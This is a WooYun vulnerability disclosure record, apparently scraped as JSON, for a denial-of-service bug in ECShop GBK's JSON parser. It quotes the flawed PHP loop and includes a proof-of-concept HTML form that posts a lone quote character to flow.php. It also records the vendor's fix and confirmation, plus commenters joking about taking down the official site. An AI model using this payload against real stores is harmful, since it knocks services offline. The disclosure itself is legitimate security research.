{"id": 8572, "wybug_id": "wooyun-2013-033188", "wybug_title": "ECShop GBK版json解析模块可致拒绝服务", "wybug_corp": "ShopEx", "wybug_author": "monster", "wybug_date": "2013-08-01 18:39", "wybug_open_date": "2013-10-30 18:40", "wybug_type": "拒绝服务", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-09-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-10-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-30：\t细节向公众公开  简要描述： ECShop GBK版json解析模块有点问题当提交恶意json数据时可致php死循环。 详细说明：  includes/cls_json.php文件\n212     function str()213     {214         $i = '';215         $s = '';216         $t = '';217         $u = '';218 219         if ($this->ch == '\"')220         {221             while ($this->next() !== null)222             {223                 if ($this->ch == '\"')224                 {225                     $this->next();226 227                     return $s;228                 }229                 elseif ($this->ch == '\\\\')230                 {231                     switch ($this->next())232                     {233                         case 'b':234                             $s .= '\\b';235                             break;236 237                         case 'f':238                             $s .= '\\f';239                             break;240 241                         case 'n':242                             $s .= '\\n';243                             break;244 245                         case 'r':246                             $s .= '\\r';247                             break;248 249                         case 't':250                             $s .= '\\t';251                             break;252 253                         case 'u':254                             $u = 0;255 256                             for ($i = 0; $i < 4; $i++)257                             {258                                 $t = (integer) sprintf('%01c', hexdec($this->next()));259 260                                 if (!is_numeric($t))261                                 {262                                     break 2;263                                 }264                                 $u = $u * 16 + $t;265                             }266 267                             $s .= chr($u);268                             break;269                         case '\\'':270                             $s .= '\\'';271                             break;272                         default:273                             $s .= $this->ch;274                     }275                 }276                 else277                 {278                     $s .= $this->ch;279                 }280             }281         }282 283         $this->error('Bad string');284     }\n注意221行。next()的返回值与null是三等号。。。再看next()的代码\n197     function next()198     {199         $this->ch = !isset($this->text{$this->at}) ? '' : $this->text{$this->at};200         $this->at++;201 202         return $this->ch;203     }\n这里当at索引的值不存在时返回的是''。。。再回到上面。221行就死循环了   漏洞证明：  随便找个用到json的地方测试。。以/flow.php?step=add_to_cart为例够造如下表单\n<form action=\"http://xxx.com/shop/flow.php?step=add_to_cart\" method=\"post\">\t<input name=\"goods_id\" value=\"1\"><br>\t<input name=\"goods\" value=\"&quot;\"><br>\t<input type=\"submit\"></form>\n。。。提交后卡了30秒。然后返回了。。（返回的时候还报了sql错误。不知道这是为什么，我本地测试是没有的）\n\n本地测试下。。。原来cpu0.0%\n\n..请求一次以后\n\nCPU瞬间98%。。。趁页面卡在那里不动。。。多点几次提交按钮。。大概狂点了20秒。。再访问一次主页\n\n已经死了的样子。。mysql连不了了。。我机器风扇已经转地和狗一样了。。   修复方案：  用二等号就好了。。不要用三等号   版权声明：转载请注明来源 monster@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2013-08-02 23:04 厂商回复： 非常感谢您为shopex信息安全做的贡献我们将尽快修复非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-01 19:10 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  这尼玛也可以？    \n     2013-08-01 19:14 |    \t\tmonster \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:10        )\t\t \n  @xsser 不知道会不会被忽略。。。官方是utf8的。。不然直接把官方打死好了    \n     2013-08-01 21:10 |    \t\t0x0F \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:60        | 尖刀安全 (JDSec.Com).......................)\t\t \n  求打死。@xsser 劈了不？    \n     2013-08-02 09:02 |    \t\t黑色的屌丝 \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:5        | →_→→_→)\t\t \n  尼玛，这都可以？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}